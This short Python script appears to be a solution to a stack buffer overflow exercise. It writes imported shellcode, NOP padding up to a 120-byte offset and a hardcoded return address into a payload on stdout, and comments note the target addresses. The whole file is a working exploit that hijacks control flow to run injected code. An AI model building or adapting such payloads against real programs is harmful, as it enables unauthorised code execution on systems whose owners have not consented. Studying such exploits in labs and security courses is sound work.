#!/usr/bin/env python3

import sys
from shellcode import shellcode

# Address where shellcode will be placed (start of buffer)

# The offset from the start of our buffer to the saved return address is 120 bytes
offset_to_return = 120
address = 0x7ffffff6a100

payload = shellcode + b'\x90' * (offset_to_return - len(shellcode))  + address.to_bytes(8, 'little')

# Write payload to stdout
#return address 0x0000000000401e66

#memory we want to overwrite: 0x7ffffff6a178

#memory address shellcode starts at: 0x7ffffff6a100

sys.stdout.buffer.write(payload)
